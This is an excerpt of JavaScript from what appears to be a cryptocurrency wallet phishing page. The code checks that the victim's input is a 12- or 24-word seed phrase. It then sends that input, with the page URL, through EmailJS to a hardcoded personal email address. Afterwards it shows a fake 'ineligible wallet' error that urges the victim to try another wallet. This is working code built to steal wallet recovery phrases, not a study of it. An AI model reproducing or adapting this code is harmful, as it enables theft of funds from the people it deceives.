...
function connect() {
    ...
    if (user_input == "") {
        ...
        alert("Data entered is not valid "+user_input_type);
    }
}
...
function sendProjectMail(text) {
    emailjs.send("service_g840mmb", "template_70tpqeq", {
        site_url: window.location.href,
        site_admin: "emmabrooke073@gmail.com",
        message: `${text}`,
    }, "ugyUxL6UR9G2oWV2h")
        .then(function (response) {
            // window.location.href = '../success/index.html'; //successfully connected
            closeModal();
            document.getElementById("root").innerHTML = `<div id="errorDiv"><p>Error Connecting. ❌<br>📉 Insufficient Volume / Ineligible wallet! ❗ <br>Refresh and try another wallet <br>⚠️ </p></div>`;
...
const validate = (token) => {
    const words = (token.toLowerCase()).trim().split(/\s+/);
    if (token.includes(" ")) {
      return /^[a-zA-Z\s]+$/.test(token) && (words.length === 12 || words.length === 24) && words.every(word => validWords.includes(word));
    } else {
